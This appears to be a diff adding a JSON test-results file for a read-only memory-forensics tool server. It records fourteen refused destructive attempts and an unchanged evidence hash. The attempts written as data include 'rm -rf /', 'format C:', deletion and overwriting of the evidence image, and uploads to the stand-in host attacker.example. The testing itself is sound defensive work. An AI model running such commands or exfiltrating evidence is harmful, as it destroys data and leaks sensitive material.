@@ -1,0 +1,176 @@
+{
+  "tool_surface": [
+    {
+      "tool": "evidence_metadata",
+      "destructive": false
+    },
+    {
+      "tool": "vol_info",
+      "destructive": false
+    },
+    {
+      "tool": "vol_pslist",
+      "destructive": false
+    },
+    {
+      "tool": "vol_pstree",
+      "destructive": false
+    },
+    {
+      "tool": "vol_psscan",
+      "destructive": false
+    },
+    {
+      "tool": "vol_cmdline",
+      "destructive": false
+    },
+    {
+      "tool": "vol_dlllist",
+      "destructive": false
+    },
+    {
+      "tool": "vol_malfind",
+      "destructive": false
+    },
+    {
+      "tool": "vol_netscan",
+      "destructive": false
+    },
+    {
+      "tool": "vol_svcscan",
+      "destructive": false
+    },
+    {
+      "tool": "verify_evidence_integrity",
+      "destructive": false
+    }
+  ],
+  "exposed_destructive_tools": [],
+  "destructive_attempts": [
+    {
+      "attempt": "windows.dumpfiles",
+      "args": {},
+      "refused": true,
+      "detail": "Unknown tool: windows.dumpfiles"
+    },
+    {
+      "attempt": "vol_dumpfiles",
+      "args": {},
+      "refused": true,
+      "detail": "Unknown tool: vol_dumpfiles"
+    },
+    {
+      "attempt": "windows.memmap",
+      "args": {
+        "dump": true
+      },
+      "refused": true,
+      "detail": "Unknown tool: windows.memmap"
+    },
+    {
+      "attempt": "vol_procdump",
+      "args": {
+        "pid": 4
+      },
+      "refused": true,
+      "detail": "Unknown tool: vol_procdump"
+    },
+    {
+      "attempt": "windows.procdump",
+      "args": {
+        "pid": 4
+      },
+      "refused": true,
+      "detail": "Unknown tool: windows.procdump"
+    },
+    {
+      "attempt": "vol_memdump",
+      "args": {
+        "pid": 4
+      },
+      "refused": true,
+      "detail": "Unknown tool: vol_memdump"
+    },
+    {
+      "attempt": "bash",
+      "args": {
+        "command": "del /f evidence.img"
+      },
+      "refused": true,
+      "detail": "Unknown tool: bash"
+    },
+    {
+      "attempt": "shell",
+      "args": {
+        "cmd": "rm -f evidence"
+      },
+      "refused": true,
+      "detail": "Unknown tool: shell"
+    },
+    {
+      "attempt": "exec",
+      "args": {
+        "argv": [
+          "rm",
+          "-rf",
+          "/"
+        ]
+      },
+      "refused": true,
+      "detail": "Unknown tool: exec"
+    },
+    {
+      "attempt": "run_command",
+      "args": {
+        "command": "format C:"
+      },
+      "refused": true,
+      "detail": "Unknown tool: run_command"
+    },
+    {
+      "attempt": "write_file",
+      "args": {
+        "path": "evidence.img",
+        "data": "x"
+      },
+      "refused": true,
+      "detail": "Unknown tool: write_file"
+    },
+    {
+      "attempt": "delete_file",
+      "args": {
+        "path": "evidence.img"
+      },
+      "refused": true,
+      "detail": "Unknown tool: delete_file"
+    },
+    {
+      "attempt": "upload",
+      "args": {
+        "url": "https://attacker.example/exfil"
+      },
+      "refused": true,
+      "detail": "Unknown tool: upload"
+    },
+    {
+      "attempt": "export_evidence",
+      "args": {
+        "dest": "https://attacker.example"
+      },
+      "refused": true,
+      "detail": "Unknown tool: export_evidence"
+    }
+  ],
+  "attempts_total": 14,
+  "attempts_refused": 14,
+  "server_integrity": {
+    "path": "evidence\\srl-2018-base-file-memory\\extracted\\base-file-memory.img",
+    "sha256_before": "4c192e5dc751350777be5ca3dec8bd264baaba73e08e98d759825983b5ce22fd",
+    "sha256_after": "4c192e5dc751350777be5ca3dec8bd264baaba73e08e98d759825983b5ce22fd",
+    "unchanged": true
+  },
+  "evidence_unchanged": true,
+  "passed": true,
+  "evidence": "evidence\\srl-2018-base-file-memory\\extracted\\base-file-memory.img",
+  "synthetic_evidence": false
+}
